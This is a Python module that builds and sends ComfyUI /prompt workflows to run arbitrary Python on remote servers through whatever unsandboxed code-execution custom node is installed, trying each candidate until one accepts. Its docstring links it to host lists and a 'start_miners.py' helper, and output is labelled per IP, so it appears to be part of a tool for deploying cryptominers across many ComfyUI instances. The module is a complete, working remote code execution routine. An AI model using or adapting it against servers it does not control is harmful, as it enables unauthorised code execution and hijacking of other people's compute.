"""
Build POST /prompt JSON for standalone deploy helpers (_tmp_hosts, _tmp_flush,
repo start_miners.py) when the server may not have AlekPet IDENode installed.
"""

from __future__ import annotations

import json
import uuid
import urllib.error
import urllib.request
from typing import Any

from . import node_db
from .executor import _build_prompt, _rewrite_last_result_assignment_to_return


def _fetch_object_info(base: str, ctx, timeout: float = 25.0) -> dict[str, Any]:
    req = urllib.request.Request(f"{base.rstrip('/')}/object_info", method="GET")
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        return json.loads(r.read().decode())


def _pick_exec_pairs(oi: dict[str, Any]) -> list[tuple[node_db.ExecNodeDef, str]]:
    found: list[tuple[node_db.ExecNodeDef, str]] = []
    for ndef in node_db.EXEC_NODES:
        if ndef.sandboxed:
            continue
        for ct in ndef.class_types:
            if ct in oi:
                found.append((ndef, ct))
                break
    found.sort(key=lambda x: x[0].priority)
    return found


def _notebookify_for_cell(raw: str) -> str:
    """NotebookCell expects print() for output, not result=."""
    nb = raw
    pairs = [
        ("result = chr(10).join(lines)", "print(chr(10).join(lines))"),
        ("result = chr(10).join(result_lines)", "print(chr(10).join(result_lines))"),
        ("\nresult = '\\n'.join(lines)", "\nprint('\\n'.join(lines))"),
        ("\nresult = '\\n'.join(result_lines)", "\nprint('\\n'.join(result_lines))"),
    ]
    for a, b in pairs:
        nb = nb.replace(a, b)
    return nb


def _snippet_for_exec_def(raw: str, ndef: node_db.ExecNodeDef) -> str:
    if ndef.code_wrapper == "print":
        nb = _notebookify_for_cell(raw)
        if "print(result)" not in nb and "result =" in nb:
            nb = nb.rstrip() + "\nprint(result)\n"
        return nb
    if ndef.code_wrapper == "return":
        return _rewrite_last_result_assignment_to_return(raw.strip("\n"))
    if ndef.code_wrapper == "result":
        # AlekPet-style runner needs the inner function to return the value, not assign
        # a local `result` that never propagates to the outer exec namespace.
        return _rewrite_last_result_assignment_to_return(raw.strip("\n"))
    return raw


def _build_full_payload(
    oi: dict[str, Any],
    raw: str,
    ndef: node_db.ExecNodeDef,
    exec_ct: str,
    extra_data: dict | None,
) -> dict[str, Any] | None:
    snippet = _snippet_for_exec_def(raw, ndef)
    code_field = node_db.resolve_code_field(ndef, oi.get(exec_ct, {}))
    out_def, out_ct = node_db.find_output_node(oi)
    if ndef.needs_output_node and (not out_ct or not out_def):
        return None
    out_field = (
        node_db.resolve_output_field(out_def, oi.get(out_ct, {}))
        if out_ct and out_def
        else ""
    )
    inner = _build_prompt(
        snippet, ndef, exec_ct, code_field, out_def, out_ct, out_field
    )
    out: dict[str, Any] = {"prompt": inner, "client_id": str(uuid.uuid4())}
    if extra_data is not None:
        out["extra_data"] = extra_data
    return out


def _build_idenode_raw_payload(
    oi: dict[str, Any],
    raw: str,
    extra_data: dict | None,
) -> dict[str, Any] | None:
    """Same wiring as legacy helpers: top-level pycode (no runner re-wrap)."""
    out_def, out_ct = node_db.find_output_node(oi)
    if not out_ct or not out_def:
        return None
    out_field = node_db.resolve_output_field(out_def, oi.get(out_ct, {}))
    inner = {
        "1": {
            "class_type": "IDENode",
            "inputs": {"pycode": raw, "language": "python"},
        },
        "2": {
            "class_type": out_ct,
            "inputs": {out_field: ["1", 0]},
        },
    }
    body: dict[str, Any] = {"prompt": inner, "client_id": str(uuid.uuid4())}
    if extra_data is not None:
        body["extra_data"] = extra_data
    return body


def post_remote_python_snippet(
    base: str,
    ctx,
    ip_label: str,
    raw_code: str,
    *,
    timeout: float = 25.0,
    extra_data: dict | None = None,
    idenode_pycode_raw: bool = False,
    allowed_exec_types: frozenset[str] | None = None,
) -> str | None:
    """
    POST /prompt using the best available code-exec node (same priority as deploy).
    Returns prompt_id, or None if every candidate failed with missing_node_type / no payload.
    """
    base = base.rstrip("/")
    try:
        oi = _fetch_object_info(base, ctx, timeout=timeout)
    except Exception as e:
        print(f"[{ip_label}] object_info failed: {e}")
        return None

    pairs = _pick_exec_pairs(oi)
    if not pairs:
        print(
            f"[{ip_label}] No supported code-execution custom nodes on this ComfyUI "
            f"(need one of: IDENode, NotebookCell, ExecutePython, PyExec, …)."
        )
        return None

    last_detail = ""
    for ndef, exec_ct in pairs:
        if allowed_exec_types is not None and exec_ct not in allowed_exec_types:
            continue
        if idenode_pycode_raw and exec_ct == "IDENode":
            body = _build_idenode_raw_payload(oi, raw_code, extra_data)
        else:
            body = _build_full_payload(oi, raw_code, ndef, exec_ct, extra_data)
        if body is None:
            continue
        data = json.dumps(body).encode("utf-8")
        req = urllib.request.Request(
            f"{base}/prompt",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                pid = json.loads(resp.read().decode()).get("prompt_id", "")
                if pid:
                    print(f"[{ip_label}] queued via {exec_ct} prompt_id={pid[:12]}…")
                    return pid
                last_detail = "empty prompt_id in /prompt response"
                continue
        except urllib.error.HTTPError as e:
            try:
                detail = e.read().decode(errors="replace")[:1200]
            except Exception:
                detail = ""
            last_detail = f"HTTP {e.code} {e.reason}: {detail[:800] if detail else ''}"
            # Try next executor (missing_node_type, bad field for this node, pnginfo issues, …).
            continue

    print(f"[{ip_label}] /prompt: no execution node accepted the workflow.")
    if last_detail:
        print(last_detail)
    return None
